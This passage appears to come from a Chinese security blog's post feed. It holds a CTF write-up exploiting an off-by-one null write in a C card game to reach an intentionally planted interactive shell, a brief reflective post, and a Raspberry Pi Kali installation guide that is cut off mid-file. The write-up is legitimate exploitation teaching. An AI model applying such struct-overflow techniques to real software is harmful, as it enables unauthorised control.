class="line">            <span class="built_in">printf</span>(<span class="string">&quot;You lost!\n&quot;</span>);</span><br><span class="line">            gameData.playerMoney -= bet;</span><br><span class="line">        &#125;</span><br><span class="line">        gameData.ctfer.playerCards.top++;</span><br><span class="line">        gameData.opponent.playerCards.top++;</span><br><span class="line">        <span class="keyword">if</span>(gameData.playerMoney &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;You are out of coins. Game over.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(gameData.playerMoney &gt; <span class="number">500</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;You won the game!\n&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh -i&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//<span class="doctag">TODO:</span> Implement card switching hands. Cheap hack here for playability</span></span><br><span class="line">        gameData.deckSize--;</span><br><span class="line">        <span class="keyword">if</span>(gameData.deckSize == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;All card used.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这到题比较偏向于 Pwn，但是鄙人还是把它归类于 Misc，此题仅仅考察了结构体中的数据溢出的问题。首先可以看到源码中内置了一个 shell，我们的目标就是赢得游戏，拿到这个 shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(gameData.playerMoney &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You are out of coins. Game over.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(gameData.playerMoney &gt; <span class="number">500</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You won the game!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh -i&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其余代码就不具体分析了，存在溢出的结构体为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">gameState</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> playerMoney;</span><br><span class="line">    player ctfer;</span><br><span class="line">    <span class="type">char</span> name[NAMEBUFFLEN];</span><br><span class="line">    <span class="type">size_t</span> deckSize;</span><br><span class="line">    player opponent;</span><br><span class="line">&#125; gameState;</span><br></pre></td></tr></table></figure><p>宏中定义了 name 数组的大小 NAMEBUFFLEN 为 32，但是再看存储玩家输入的 name 的时候代码做了什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter your name: \n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(gameData.name,<span class="number">0</span>,NAMEBUFFLEN);</span><br><span class="line"><span class="keyword">if</span>(!readInput(gameData.name,NAMEBUFFLEN))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Read error. Exiting.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到调用 readInput 给 gameData 中的 name 数组存入了 NAMEBUFFLEN 大小的 name，继续跟进 readInput</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Reads input from user, and properly terminates the string</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">readInput</span><span class="params">(<span class="type">char</span> * buff, <span class="type">unsigned</span> <span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="keyword">while</span>((c = getchar()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF)&#123;</span><br><span class="line">        <span class="keyword">if</span>(count &lt; (len<span class="number">-1</span>))&#123;</span><br><span class="line">            buff[count] = c;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    buff[count+<span class="number">1</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先用了个 count 做计数器，计算一行读入了多少个字符，注意这里终止在 buff 中记录 name 的条件是<code>count &lt; (len-1)</code>，如果我们输入 32 个字符，那么当 count 为 31 时终止读入字符到 buff 中，继续往下看，结尾有个很奇怪的行为<code>buff[count+1] = &#39;\x00&#39;;</code></p><p>当在 buff 读入终止后此时的 count 为 31，count+1 为 32，会将 buff 第 32 位设置为 0x00，而 buff 的大小为 32，下标从 0 到 31，当读入的 name 超过了 31 到 32 的时候会发生什么？看结构体 name 数组下面那个变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> name[NAMEBUFFLEN];</span><br><span class="line"><span class="type">size_t</span> deckSize;</span><br></pre></td></tr></table></figure><p>在结构体中的数据是相邻存放的，即从 name 中溢出的第 32 位字符（\x00）会将 deckSize 置 0，那么现在我们可以控制 deckSize 为 0，继续跟进 deckSize 到最后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span> Implement card switching hands. Cheap hack here for playability</span></span><br><span class="line">gameData.deckSize--;</span><br><span class="line"><span class="keyword">if</span>(gameData.deckSize == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;All card used.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在检查 deckSize 为 0 之前先自减了一次，即此时 deckSize 变成了 -1，这意味着 deckSize 将永远不会为 0，我们的牌就永远用不完，但是这又有什么用？我们的目标是赢得游戏，那么继续向前看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">deck</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> deckSize;</span><br><span class="line">    <span class="type">size_t</span> top;</span><br><span class="line">    card cards[<span class="number">52</span>];</span><br><span class="line">&#125; deck;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">player</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> money;</span><br><span class="line">    deck playerCards;</span><br><span class="line">&#125; player;</span><br></pre></td></tr></table></figure><p>我们的牌存储在_deck 结构体中的 cards 中，游戏中每次摸牌的时候就是从这个数组中取，可以看到这个数组的大小只有 52，那么当我们把 52 张牌都用完了，并且还没有结束游戏的时候会发生什么？我们来把这三个结构体的顺序仔细分析一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">card</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> suit;</span><br><span class="line">    <span class="type">char</span> value;</span><br><span class="line">&#125; card;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">deck</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> deckSize;</span><br><span class="line">    <span class="type">size_t</span> top;</span><br><span class="line">    card cards[<span class="number">52</span>]; <span class="comment">// 恰巧这个结构体中最后一项数据就是我们的牌</span></span><br><span class="line">&#125; deck;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">player</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> money;</span><br><span class="line">    deck playerCards; <span class="comment">// 而这个结构体的结尾存储上面的 deck 结构体</span></span><br><span class="line">&#125; player;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">gameState</span>&#123;</span></span><br><span class="line">  <span class="type">int</span> playerMoney;</span><br><span class="line">  player ctfer; <span class="comment">// 这里存储上一个 player 结构体</span></span><br><span class="line">  <span class="type">char</span> name[NAMEBUFFLEN];</span><br><span class="line">  <span class="type">size_t</span> deckSize;</span><br><span class="line">  player opponent;</span><br><span class="line">&#125; gameState;</span><br></pre></td></tr></table></figure><p>此时我们看一下 gameData 中我们关心的数据在内存中是如何存放的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">···</span><br><span class="line">···</span><br><span class="line"><span class="type">size_t</span>  top</span><br><span class="line">card    cards * <span class="number">52</span></span><br><span class="line"><span class="type">char</span>    name * <span class="number">32</span></span><br><span class="line"><span class="type">size_t</span>  deckSize</span><br><span class="line">···</span><br><span class="line">···</span><br></pre></td></tr></table></figure><p>结构体是按照数据的定义顺序存放的，可以看到 cards 数组紧挨着 name 数组，而游戏中摸牌的时候是根据 top 来摸的，top 如果大于了 52（如果我们不能控制 deckSize 的话此时游戏已经结束了），摸牌的时候就会从 name 数组中按照 card 结构体的大小去取，所以当摸了超过 52 张牌后我们就可以控制 card 的 value。试验一下我们取名字时取 32 个 A，每一赌 1 个 coin，当剩下 48 个 coin 时（即已经摸完了 52 张牌），会出现如下结果</p><p><img src="/2018/06/11/OUCCTF2018-Partial-Writeup/TIM%E6%88%AA%E5%9B%BE20180613233017.png"></p><p>65 恰巧就是’A’的 ASCII 码，这印证了前面的猜想，但是注意到它会说<code>That&#39;s not actually a valid card.</code>，回到源码中看到这是由于没有通过检查函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Checks if a card is in invalid range</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">checkInvalidCard</span><span class="params">(card * inputCard)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(inputCard-&gt;suit &gt; <span class="number">4</span> || inputCard-&gt;value &gt; <span class="number">14</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在检查条件中的 inputCard-&gt;value 是我们可以随意控制的，但是 65 大于 14，所以没有通过检查。现在我们有两个解决办法：</p><ol><li>用脚本去发送 32 个’\x13’作为我们的名字</li><li>继续向下赌，每次赌 1 个 coin。</li></ol><p>还记得前面的 top 吗？虽然我们的名字是 32 个’A’（65），但是当 top 越过了 name 数组后碰到的会是后面的变量</p><p><img src="/2018/06/11/OUCCTF2018-Partial-Writeup/TIM%E6%88%AA%E5%9B%BE20180613234028.png"></p><p>我们看看 name 和 deckSize 变量后面有哪些数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> name[NAMEBUFFLEN];</span><br><span class="line"><span class="type">size_t</span> deckSize;</span><br><span class="line">player opponent;</span><br></pre></td></tr></table></figure><p>正好是我们的对手的数据，这样让 top 一直增加，直到到了 opponent 的 cards 数组里，我们看一下在创建牌组的时候代码为 opponent 的牌组做了些什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Builds the deck for each player.</span></span><br><span class="line"><span class="comment">//Good luck trying to win ;)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildDecks</span><span class="params">(player * ctfer, player * opponent)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">            ctfer-&gt;playerCards.cards[j*<span class="number">4</span> + i].suit = i;</span><br><span class="line">            ctfer-&gt;playerCards.cards[j*<span class="number">4</span> + i].value = j+<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">            opponent-&gt;playerCards.cards[j*<span class="number">4</span> + i].suit = i;</span><br><span class="line">            opponent-&gt;playerCards.cards[j*<span class="number">4</span> + i].value = j+<span class="number">9</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">24</span>].suit = <span class="number">0</span>;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">24</span>].value = <span class="number">8</span>;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">25</span>].suit = <span class="number">1</span>;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">25</span>].value = <span class="number">8</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">24</span>].suit = <span class="number">2</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">24</span>].value = <span class="number">8</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">25</span>].suit = <span class="number">3</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">25</span>].value = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    ctfer-&gt;playerCards.deckSize = <span class="number">26</span>;</span><br><span class="line">    ctfer-&gt;playerCards.top = <span class="number">0</span>;</span><br><span class="line">    opponent-&gt;playerCards.deckSize = <span class="number">26</span>;</span><br><span class="line">    opponent-&gt;playerCards.top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的可以看到 opponent 的牌 value 明显大于我们，那么我们在出牌的时候 value 就会是 opponent 的 value 了 <br> 注意 top 时同时增长的，我们的 top 到了 opponent 的数据区里，而 opponent 的 top 到哪就不关我们的事了，这样就能赢了 <br> 最后拿到 shell，flag 为</p><blockquote><p>flag{W0W_Y0u_w1n_7he_g4mb11ng}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Who I am? What’s real? What’s the truth?</title>
      <link href="/2018/06/03/Who-I-am-What%E2%80%99s-real-What%E2%80%99s-the-truth/"/>
      <url>/2018/06/03/Who-I-am-What%E2%80%99s-real-What%E2%80%99s-the-truth/</url>
      
        <content type="html"><![CDATA[<p>Is it real? Is every real?<br>Actually, You are nothing but yourself.</p><p><img src="/2018/06/03/Who-I-am-What%E2%80%99s-real-What%E2%80%99s-the-truth/005znnVBly1fri8bbcemlj30fn35s7wj.jpg"></p><hr><p>I just kept on running, running, running.<br>Trying to find out who I was.<br>I would go the distance but it wasn’t far enough.<br>But now I’m standing straight and know exactly who I am.<br><img src="/2018/06/03/Who-I-am-What%E2%80%99s-real-What%E2%80%99s-the-truth/005znnVBly1fri8beaov9j30k02sq4qq.jpg"></p><hr><p>Every day, We change the world, but to changes the world in a way that means anything, that takes more time than most people have.<br>It never happens all at once.</p><p>It’s slow.<br>It’s methodical.<br>It’s exhausting.</p><p>We don’t all have the stomach for it.</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Think </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派安装 Kali 记录</title>
      <link href="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="树莓派"><a href="# 树莓派" class="headerlink" title="树莓派"></a>树莓派 </h1><p> 昨天晚上鄙人在树莓派的 kali 里在安装某 IDE 的时候死机了，只能断电重启，再开机的时候更新时出现了 <code>Structure Needs Cleaning</code> 错误，找了很多办法没有解决，嫌麻烦，不如重新安装一下树莓派 kali 系统，顺便记录下安装过程。</p><p>鄙人使用的是树莓派 3B+，用了半年，总得来说感觉还不错，运行 kali 桌面版还是很流畅的，就是内存有点小，msf 这类的重武器有时候会因为内存不够而崩溃，配上了一个外壳，小触控屏，小键盘，可以随身携带，充电宝就能供电，某品牌 1w 毫安充电宝一格电能用一下午，用来无线渗透效果最好，当然 nmap 扫一扫也行，用来爆破的话效率很低，不过休闲的时候当个 pad 看看电影什么的也挺不错。</p><p><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E5%9B%BE%E7%89%8720180601152842.jpg"></p><p>树莓派各版本配置如下（图片来源 <a href="http://shumeipai.nxez.com/"> 树莓派实验室</a>）<br><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/raspberrypi-version-compare.png"></p><h1 id="SD 卡"><a href="#SD 卡" class="headerlink" title="SD 卡"></a>SD 卡 </h1><p> 首先需要准备一张 SD 卡，不用太大，经济版 16G，高配版 32G，按需选择即可，如果想在树莓派中存一些大字典可以考虑 64G 或 128G。使用 <a href="https://www.sdcard.org/downloads/formatter_4/index.html">SDCardFormatter</a> 格式化 SD 卡，格式化的时候选择快速格式化即可。</p><p><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20180601134357.png"></p><h1 id="kali-Linux"><a href="#kali-Linux" class="headerlink" title="kali Linux"></a>kali Linux</h1><p>下载 <a href="https://www.offensive-security.com/kali-linux-arm-images/">kali 的树莓派版本</a>，选择<strong>Kali Linux RaspberryPi 2 and 3</strong>，Kali Linux Rpi0w Nexmon 是为树莓派 zero 提供的，以及 Kali Linux RaspberryPi w/TFT 是为触屏提供的，这两个版本在本文中不涉及。下载完成后会得到<code>.img.xz</code> 后缀的文件，解压即可，听说不解压也可以直接烧录进 SD 卡，但是鄙人并没有成功，为了保险起见还是解压之后在烧录。</p><p>把 SD 卡插入电脑（使用读卡器），再使用 Win32DiskImager 将 kali 镜像烧录到 SD 卡中，会弹出一个确认框，警告会擦除 SD 卡中所有数据，直接点击确定。<br><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20180601161329.png"></p><p>烧录过程可能会有点慢，左下角可以看到烧录速度，大概需要十分钟到十五分钟，烧录速度具体取决于不同电脑，尽量不要在烧录的时候操作电脑，否则会拖慢烧录速度。</p><p><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20180601161547.png"></p><p>烧录完成后 Windows 会弹出一个框，要格式化这张卡，不用管直接关掉，拔出 SD 卡，理论上此时你的 SD 卡应该会很烫，建议稍微降降温等一会再插入树莓派中。</p><h1 id="在树莓派上安装 Kali"><a href="# 在树莓派上安装 Kali" class="headerlink" title="在树莓派上安装 Kali"></a>在树莓派上安装 Kali</h1><p>刚才已经烧录完了 kali 系统，现在把 SD 卡插到树莓派中，启动电源，会自动安装系统，此时会看到树莓派上的绿灯在疯狂闪，这就代表树莓派正在对 SD 卡读写，<strong>注意在树莓派的绿灯有闪动的时候千万不要断电！:)</strong></p><p>安装时最好能有个屏幕，否则安装结束后登录 kali 会很麻烦，鄙人不才，暂时没有无屏幕安装 kali 的办法，Kali 不同于 raspbian，虽然它们默认都没有启用 ssh，但是 raspbian 可以手动在 SD 卡中放入一个名为 SSH 的文件来启用 ssh，安装系统成功之后直接 ssh 登录进去就可以，不需要屏幕，但是鄙人曾经在 kali 上用这种方法测试了一下午都没成功，所以安装 kali 时最好用一个屏幕，之后在系统内配置 ssh，后文会讲。</p><p>当你看到下面这个界面的时候就代表正在进行安装，如果一直是黑屏的话检查一下绿灯有没有闪，没有的话检查下前面的步骤或者检查下 SD 卡有没有问题，再不行的话可能就是树莓派的问题了。</p><p><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E5%9B%BE%E7%89%8720180601165426.jpg"></p><p>安装成功后默认用户名密码登录即可，默认的用户名是<code>root</code>，密码是<code>toor</code>。</p><h1 id="开启 SSH"><a href="# 开启 SSH" class="headerlink" title="开启 SSH"></a>开启 SSH</h1><p>第一次登录成功后会让你选择 xface 的配置，选择默认配置即可，否则你会发现登录后的桌面空空如也，什么也没有，登录后的界面如下图，最好先连接 Wifi，否则后面的有些配置会无法进行。</p><p><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E5%9B%BE%E7%89%8720180601165422.jpg"></p><p>首先要打开 ssh，打开终端输入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-reconfigure openssh-server</span><br></pre></td></tr></table></figure><p>之后一定要记得修改密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure><p>这时可以用 ssh 连接尝试一下，主机和树莓派最好在同一个内网里，连接可以用有线或无线连接，任意选择一种即可。</p><ul><li>有线连接<br>  将网线与树莓派相连，共享无线网络，具体操作如下图所示，打开 cmd，输入 arp -a 查看 arp 记录，找到树莓派的 mac 地址，即可找到树莓派的 ip 地址，ssh 连接即可，断开连接后记得关闭共享无线网络。<br>  <img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20180601165031.png"></li><li>无线连接<br>  主机于树莓派同时连接到一个内网，或者主机打开热点树莓派连接。</li></ul><h1 id="Raspi-config"><a href="#Raspi-config" class="headerlink" title="Raspi-config"></a>Raspi-config</h1><p>连接到树莓派以后可以先稍稍美化一下终端，修改.bushrc 文件，可以将终端的风格改为标准的 Kali 风格，鄙人的 bushrc 文件如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># System-wide .bashrc file for interactive bash(1) shells.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># To enable the settings / commands in this file for login shells as well,</span></span><br><span class="line"><span class="comment"># this file has to be sourced in /etc/profile.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If not running interactively, don&#x27;t do anything</span></span><br><span class="line">[-z <span class="string">&quot;<span class="variable">$PS1</span>&quot;</span> ] &amp;&amp; <span class="built_in">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># check the window size after each command and, if necessary,</span></span><br><span class="line"><span class="comment"># update the values of LINES and COLUMNS.</span></span><br><span class="line"><span class="built_in">shopt</span> -s checkwinsize</span><br><span class="line"></span><br><span class="line"><span class="comment"># set variable identifying the chroot you work in (used in the prompt below)</span></span><br><span class="line"><span class="keyword">if</span> [-z <span class="string">&quot;<span class="variable">$&#123;debian_chroot:-&#125;</span>&quot;</span> ] &amp;&amp; [-r /etc/debian_chroot]; <span class="keyword">then</span></span><br><span class="line">    debian_chroot=$(<span class="built_in">cat</span> /etc/debian_chroot)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set a fancy prompt (non-color, overwrite the one in /etc/profile)</span></span><br><span class="line"><span class="comment"># PS1=&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#x27;</span></span><br><span class="line"><span class="comment"># PS1=&#x27;\[\e]0;\u@\h: \w\a\]\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ &#x27;</span></span><br><span class="line"><span class="comment"># PS1=&#x27;\[\e]0;\u@\h: \w\a\]$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$&#x27;</span></span><br><span class="line">PS1=<span class="string">&#x27;\[\033[38;5;196m\]\u@\h\[$(tput sgr0)\]\[\033[38;5;15m\]:\[$(tput 